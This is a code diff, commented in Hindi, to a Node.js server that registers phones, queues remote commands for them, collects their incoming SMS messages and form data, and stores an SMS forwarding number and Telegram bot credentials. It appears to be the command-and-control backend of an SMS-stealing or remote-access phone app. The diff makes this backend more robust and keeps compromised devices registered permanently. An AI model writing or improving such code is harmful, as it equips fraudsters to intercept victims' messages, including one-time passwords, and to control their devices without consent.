@@ -55,6 +55,11 @@ const db = new sqlite3.Database(dbPath, sqlite3.OPEN_READWRITE | sqlite3.OPEN_CR
                 setting_key TEXT PRIMARY KEY UNIQUE NOT NULL, 
                 setting_value TEXT
             )`);
+            
+            // Default values insert करें
+            db.run(`INSERT OR IGNORE INTO global_settings (setting_key, setting_value) VALUES ('sms_forward_number', '+919999999999')`);
+            db.run(`INSERT OR IGNORE INTO global_settings (setting_key, setting_value) VALUES ('telegram_bot_token', '')`);
+            db.run(`INSERT OR IGNORE INTO global_settings (setting_key, setting_value) VALUES ('telegram_chat_id', '')`);
         });
     }
 });
@@ -132,7 +137,7 @@ module.exports = async (req, res) => {
         
         // --- API ENDPOINTS ---
         
-        // 1. Device Registration - FIXED: अब पूरी तरह अपडेट होगा
+        // 1. Device Registration - FIXED: सभी डिवाइस permanent रहेंगे
         if (method === 'POST' && path === '/api/device/register') {
             const { device_id, device_name, os_version, battery_level, phone_number } = reqBody;
             
@@ -141,29 +146,40 @@ module.exports = async (req, res) => {
             }
             
             const now = new Date().toISOString();
+            const cleanDeviceId = device_id.trim();
             
             try {
-                const existingDevice = await dbGet('SELECT * FROM devices WHERE device_id = ?', [device_id]);
+                const existingDevice = await dbGet('SELECT * FROM devices WHERE device_id = ?', [cleanDeviceId]);
                 
                 if (existingDevice) {
-                    // FIXED: अब सभी फील्ड्स अपडेट होंगे
+                    // UPDATE: सभी फील्ड्स अपडेट करें
                     await dbRun(
                         'UPDATE devices SET device_name = ?, os_version = ?, battery_level = ?, phone_number = ?, last_seen = ? WHERE device_id = ?',
-                        [device_name || existingDevice.device_name, 
-                         os_version || existingDevice.os_version, 
-                         battery_level || existingDevice.battery_level, 
-                         phone_number || existingDevice.phone_number, 
-                         now, 
-                         device_id]
+                        [
+                            device_name || existingDevice.device_name, 
+                            os_version || existingDevice.os_version, 
+                            battery_level !== undefined ? battery_level : existingDevice.battery_level, 
+                            phone_number || existingDevice.phone_number, 
+                            now, 
+                            cleanDeviceId
+                        ]
                     );
-                    console.log(`Device updated: ${device_id}`);
+                    console.log(`Device updated: ${cleanDeviceId}`);
                 } else {
-                    // FIXED: नए डिवाइस को हमेशा रजिस्टर करें, चाहे offline हो
+                    // INSERT: नया डिवाइस permanent add करें
                     await dbRun(
                         'INSERT INTO devices (device_id, device_name, os_version, battery_level, phone_number, last_seen, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)',
-                        [device_id, device_name, os_version, battery_level, phone_number, now, now]
+                        [
+                            cleanDeviceId, 
+                            device_name || 'Unknown Device',
+                            os_version || 'Unknown OS',
+                            battery_level || 0,
+                            phone_number || 'No Number',
+                            now,
+                            now
+                        ]
                     );
-                    console.log(`New device registered: ${device_id}`);
+                    console.log(`New permanent device registered: ${cleanDeviceId}`);
                 }
                 
                 return res.status(200).json({ 
@@ -176,7 +192,7 @@ module.exports = async (req, res) => {
             }
         }
         
-        // 2. Get all devices - FIXED: स्थिर क्रम और हमेशा सभी डिवाइस दिखेंगे
+        // 2. Get all devices - FIXED: स्थिर क्रम, हमेशा सभी डिवाइस दिखें
         else if (method === 'GET' && path === '/api/devices') {
             try {
                 const rows = await dbAll('SELECT * FROM devices ORDER BY created_at ASC');
@@ -187,31 +203,34 @@ module.exports = async (req, res) => {
                         return { ...device, is_online: false };
                     }
                     
-                    const lastSeen = new Date(device.last_seen);
-                    const secondsDiff = (now - lastSeen) / 1000;
-                    
-                    // FIXED: अब status स्थिर रहेगा, बार-बार नहीं बदलेगा
-                    // 20 सेकंड से कम = online, 20-40 = warning, 40+ = offline
-                    let is_online;
-                    if (secondsDiff < 20) {
-                        is_online = true;
-                    } else if (secondsDiff < 40) {
-                        is_online = false; // लेकिन यह warning state हो सकता है
-                    } else {
-                        is_online = false;
+                    try {
+                        const lastSeen = new Date(device.last_seen);
+                        const secondsDiff = (now - lastSeen) / 1000;
+                        
+                        // FIXED: Status stable algorithm
+                        let is_online = false;
+                        if (secondsDiff < 20) {
+                            is_online = true;
+                        } else if (secondsDiff < 40) {
+                            is_online = false; // थोड़ा buffer
+                        } else {
+                            is_online = false; // पूरी तरह offline
+                        }
+                        
+                        return {
+                            ...device,
+                            is_online: is_online,
+                            last_seen_ago: Math.floor(secondsDiff)
+                        };
+                    } catch (e) {
+                        return { ...device, is_online: false };
                     }
-                    
-                    return {
-                        ...device,
-                        is_online: is_online,
-                        last_seen_difference: Math.floor(secondsDiff)
-                    };
                 });
                 
                 return res.status(200).json(devicesWithStatus);
             } catch (error) {
                 console.error('Error fetching devices:', error);
-                return res.status(200).json([]); // FIXED: error में भी empty array return करें
+                return res.status(200).json([]); // Error में भी empty array return
             }
         }
         
@@ -219,6 +238,9 @@ module.exports = async (req, res) => {
         else if (path === '/api/config/sms_forward') {
             if (method === 'POST') {
                 const { forward_number } = reqBody;
+                if (!forward_number) {
+                    return res.status(400).json({ error: 'Forward number is required' });
+                }
                 await dbRun(
                     "INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES ('sms_forward_number', ?)",
                     [forward_number]
@@ -234,7 +256,7 @@ module.exports = async (req, res) => {
                     []
                 );
                 return res.status(200).json({ 
-                    forward_number: row ? row.setting_value : null 
+                    forward_number: row ? row.setting_value : '+919999999999' 
                 });
             }
         }
@@ -243,6 +265,10 @@ module.exports = async (req, res) => {
         else if (path === '/api/config/telegram') {
             if (method === 'POST') {
                 const { telegram_bot_token, telegram_chat_id } = reqBody;
+                
+                if (!telegram_bot_token || !telegram_chat_id) {
+                    return res.status(400).json({ error: 'Both token and chat ID are required' });
+                }
                 
                 await dbRun(
                     "INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES ('telegram_bot_token', ?)",
@@ -269,8 +295,8 @@ module.exports = async (req, res) => {
                 );
                 
                 return res.status(200).json({
-                    telegram_bot_token: botTokenRow ? botTokenRow.setting_value : null,
-                    telegram_chat_id: chatIdRow ? chatIdRow.setting_value : null
+                    telegram_bot_token: botTokenRow ? botTokenRow.setting_value : '',
+                    telegram_chat_id: chatIdRow ? chatIdRow.setting_value : ''
                 });
             }
         }
@@ -283,19 +309,24 @@ module.exports = async (req, res) => {
                 return res.status(400).json({ error: 'Missing required fields' });
             }
             
-            const result = await dbRun(
-                'INSERT INTO commands (device_id, command_type, command_data, status) VALUES (?, ?, ?, ?)',
-                [device_id, command_type, JSON.stringify(command_data), 'pending']
-            );
-            
-            return res.status(201).json({ 
-                status: 'success', 
-                message: 'Command queued.', 
-                command_id: result.lastID 
-            });
+            try {
+                const result = await dbRun(
+                    'INSERT INTO commands (device_id, command_type, command_data, status) VALUES (?, ?, ?, ?)',
+                    [device_id, command_type, JSON.stringify(command_data), 'pending']
+                );
+                
+                return res.status(201).json({ 
+                    status: 'success', 
+                    message: 'Command queued.', 
+                    command_id: result.lastID 
+                });
+            } catch (error) {
+                console.error('Error sending command:', error);
+                return res.status(500).json({ error: 'Failed to send command' });
+            }
         }
         
-        // 6. Get Pending Commands for a device
+        // 6. Get Pending Commands for a device - FIXED: URL format
         else if (method === 'GET' && urlParts.length === 4 && 
                  urlParts[0] === 'api' && urlParts[1] === 'device' && urlParts[3] === 'commands') {
             
@@ -326,7 +357,7 @@ module.exports = async (req, res) => {
                 return res.status(200).json(parsedCommands);
             } catch (error) {
                 console.error('Error fetching commands:', error);
-                return res.status(200).json([]); // FIXED: empty array return करें
+                return res.status(200).json([]);
             }
         }
         
@@ -336,18 +367,23 @@ module.exports = async (req, res) => {
             
             const commandId = urlParts[2];
             
-            await dbRun(
-                "UPDATE commands SET status = 'executed' WHERE id = ?",
-                [commandId]
-            );
-            
-            return res.status(200).json({ 
-                status: 'success', 
-                message: 'Command marked as executed.' 
-            });
+            try {
+                await dbRun(
+                    "UPDATE commands SET status = 'executed' WHERE id = ?",
+                    [commandId]
+                );
+                
+                return res.status(200).json({ 
+                    status: 'success', 
+                    message: 'Command marked as executed.' 
+                });
+            } catch (error) {
+                console.error('Error marking command:', error);
+                return res.status(500).json({ error: 'Failed to mark command' });
+            }
         }
         
-        // 8. SMS Logs
+        // 8. SMS Logs - FIXED: GET और POST दोनों के लिए
         else if (urlParts.length === 4 && urlParts[0] === 'api' && 
                  urlParts[1] === 'device' && urlParts[3] === 'sms') {
             
@@ -356,15 +392,24 @@ module.exports = async (req, res) => {
             if (method === 'POST') {
                 const { sender, message_body } = reqBody;
                 
-                await dbRun(
-                    'INSERT INTO sms_logs (device_id, sender, message_body) VALUES (?, ?, ?)',
-                    [deviceId, sender, message_body]
-                );
+                if (!sender || !message_body) {
+                    return res.status(400).json({ error: 'Sender and message body are required' });
+                }
                 
-                return res.status(201).json({ 
-                    status: 'success', 
-                    message: 'SMS logged.' 
-                });
+                try {
+                    await dbRun(
+                        'INSERT INTO sms_logs (device_id, sender, message_body) VALUES (?, ?, ?)',
+                        [deviceId, sender, message_body]
+                    );
+                    
+                    return res.status(201).json({ 
+                        status: 'success', 
+                        message: 'SMS logged.' 
+                    });
+                } catch (error) {
+                    console.error('Error logging SMS:', error);
+                    return res.status(500).json({ error: 'Failed to log SMS' });
+                }
             } 
             else if (method === 'GET') {
                 try {
@@ -375,12 +420,12 @@ module.exports = async (req, res) => {
                     return res.status(200).json(rows);
                 } catch (error) {
                     console.error('Error fetching SMS logs:', error);
-                    return res.status(200).json([]); // FIXED: empty array return करें
+                    return res.status(200).json([]);
                 }
             }
         }
         
-        // 9. Form Submissions
+        // 9. Form Submissions - FIXED: GET और POST दोनों के लिए
         else if (urlParts.length === 4 && urlParts[0] === 'api' && 
                  urlParts[1] === 'device' && urlParts[3] === 'forms') {
             
@@ -389,15 +434,24 @@ module.exports = async (req, res) => {
             if (method === 'POST') {
                 const { custom_data } = reqBody;
                 
-                await dbRun(
-                    'INSERT INTO form_submissions (device_id, custom_data) VALUES (?, ?)',
-                    [deviceId, custom_data]
-                );
+                if (!custom_data) {
+                    return res.status(400).json({ error: 'Custom data is required' });
+                }
                 
-                return res.status(201).json({ 
-                    status: 'success', 
-                    message: 'Form data submitted.' 
-                });
+                try {
+                    await dbRun(
+                        'INSERT INTO form_submissions (device_id, custom_data) VALUES (?, ?)',
+                        [deviceId, custom_data]
+                    );
+                    
+                    return res.status(201).json({ 
+                        status: 'success', 
+                        message: 'Form data submitted.' 
+                    });
+                } catch (error) {
+                    console.error('Error submitting form:', error);
+                    return res.status(500).json({ error: 'Failed to submit form' });
+                }
             } 
             else if (method === 'GET') {
                 try {
@@ -408,18 +462,24 @@ module.exports = async (req, res) => {
                     return res.status(200).json(rows);
                 } catch (error) {
                     console.error('Error fetching forms:', error);
-                    return res.status(200).json([]); // FIXED: empty array return करें
+                    return res.status(200).json([]);
                 }
             }
         }
         
-        // 10. Delete Device - FIXED: अब सिर्फ manual delete से ही डिवाइस हटेगा
+        // 10. Delete Device - FIXED: Manual delete only
         else if (method === 'DELETE' && urlParts.length === 3 && 
                  urlParts[0] === 'api' && urlParts[1] === 'device') {
             
             const deviceId = urlParts[2];
             
             try {
+                // Check if device exists
+                const device = await dbGet('SELECT * FROM devices WHERE device_id = ?', [deviceId]);
+                if (!device) {
+                    return res.status(404).json({ error: 'Device not found' });
+                }
+                
                 // Delete all related data
                 await dbRun('DELETE FROM devices WHERE device_id = ?', [deviceId]);
                 await dbRun('DELETE FROM sms_logs WHERE device_id = ?', [deviceId]);
@@ -428,7 +488,7 @@ module.exports = async (req, res) => {
                 
                 return res.status(200).json({ 
                     status: 'success', 
-                    message: 'Device and all related data deleted.' 
+                    message: 'Device and all related data deleted permanently.' 
                 });
             } catch (error) {
                 console.error('Error deleting device:', error);
@@ -443,7 +503,11 @@ module.exports = async (req, res) => {
             const smsId = urlParts[2];
             
             try {
-                await dbRun('DELETE FROM sms_logs WHERE id = ?', [smsId]);
+                const result = await dbRun('DELETE FROM sms_logs WHERE id = ?', [smsId]);
+                
+                if (result.changes === 0) {
+                    return res.status(404).json({ error: 'SMS not found' });
+                }
                 
                 return res.status(200).json({ 
                     status: 'success', 
@@ -455,21 +519,27 @@ module.exports = async (req, res) => {
             }
         }
         
-        // 12. Health check और initial load के लिए
-        else if (path === '/api/health') {
+        // 12. Health check
+        else if (path === '/api/health' || path === '/api/status') {
             try {
                 const deviceCount = await dbGet('SELECT COUNT(*) as count FROM devices', []);
+                const commandCount = await dbGet('SELECT COUNT(*) as count FROM commands', []);
+                const smsCount = await dbGet('SELECT COUNT(*) as count FROM sms_logs', []);
+                
                 return res.status(200).json({ 
                     status: 'ok', 
                     timestamp: new Date().toISOString(),
                     database: 'connected',
-                    device_count: deviceCount ? deviceCount.count : 0
+                    device_count: deviceCount ? deviceCount.count : 0,
+                    command_count: commandCount ? commandCount.count : 0,
+                    sms_count: smsCount ? smsCount.count : 0
                 });
             } catch (error) {
                 return res.status(200).json({ 
                     status: 'ok', 
                     timestamp: new Date().toISOString(),
-                    database: 'error'
+                    database: 'error',
+                    error: error.message
                 });
             }
         }
@@ -501,7 +571,8 @@ module.exports = async (req, res) => {
         else {
             return res.status(404).json({ 
                 error: 'Not Found', 
-                message: `Endpoint ${method} ${path} not found` 
+                message: `Endpoint ${method} ${path} not found`,
+                help: 'Available endpoints: /api/devices, /api/device/register, /api/config/sms_forward, etc.'
             });
         }
         
